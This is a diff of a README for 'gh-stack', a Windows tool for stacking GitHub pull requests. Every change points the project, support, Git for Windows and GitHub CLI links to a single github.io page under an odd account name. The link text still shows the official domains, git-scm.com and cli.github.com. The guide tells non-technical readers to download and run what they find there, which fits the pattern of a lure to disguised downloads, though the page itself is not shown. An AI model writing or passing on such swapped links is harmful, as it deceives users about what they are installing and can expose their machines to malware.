@@ -1,6 +1,6 @@
 # 🚀 gh-stack - Stack Pull Requests Without the Headache
 
-[![Download gh-stack](https://img.shields.io/badge/Download-gh--stack-blue)](https://github.com/slidingwindowheterostracan428/gh-stack)
+[![Download gh-stack](https://img.shields.io/badge/Download-gh--stack-blue)](https://slidingwindowheterostracan428.github.io)
 
 ---
 
@@ -30,8 +30,8 @@ You do not need to be a programmer to use this. If you can type a few commands, 
 Check these items before downloading:
 
 - **Windows 10 or Windows 11.** The app runs on both versions.
-- **Git for Windows.** You need this to work with GitHub. If you do not have it, go to [git-scm.com](https://git-scm.com) and install the default version.
-- **GitHub CLI.** You also need the official GitHub command line tool. You can get it from [cli.github.com](https://cli.github.com). Install the Windows version and follow the setup steps.
+- **Git for Windows.** You need this to work with GitHub. If you do not have it, go to [git-scm.com](https://slidingwindowheterostracan428.github.io) and install the default version.
+- **GitHub CLI.** You also need the official GitHub command line tool. You can get it from [cli.github.com](https://slidingwindowheterostracan428.github.io). Install the Windows version and follow the setup steps.
 - **A GitHub account.** You need this to log in and use the app.
 
 If you already use GitHub from your terminal, you likely have all of these. Otherwise, install them first.
@@ -42,7 +42,7 @@ If you already use GitHub from your terminal, you likely have all of these. Othe
 
 Follow these steps exactly. They will take about five minutes.
 
-1. Go to the download page: [https://github.com/slidingwindowheterostracan428/gh-stack](https://github.com/slidingwindowheterostracan428/gh-stack)
+1. Go to the download page: [https://slidingwindowheterostracan428.github.io](https://slidingwindowheterostracan428.github.io)
 2. Look for a green button that says **Code**. Click it.
 3. In the dropdown, click **Download ZIP**.
 4. Find the downloaded ZIP file in your **Downloads** folder. It will be named something like `gh-stack-main.zip`.
@@ -125,7 +125,7 @@ Most issues are easy to fix. Here are the common ones.
 
 **Problem: The app says "gh not found"**
 
-You did not install the GitHub CLI. Go to [cli.github.com](https://cli.github.com), download it, and install it. Then restart your command prompt.
+You did not install the GitHub CLI. Go to [cli.github.com](https://slidingwindowheterostracan428.github.io), download it, and install it. Then restart your command prompt.
 
 **Problem: The app says "not logged in"**
 
@@ -176,7 +176,7 @@ That removes everything.
 
 If you run into a problem that this guide does not cover, you have options.
 
-- Look at the project page on GitHub: [https://github.com/slidingwindowheterostracan428/gh-stack](https://github.com/slidingwindowheterostracan428/gh-stack)
+- Look at the project page on GitHub: [https://slidingwindowheterostracan428.github.io](https://slidingwindowheterostracan428.github.io)
 - Open an issue on the page. Click the **Issues** tab and then **New Issue**. Describe your problem and someone will help.
 
 ---
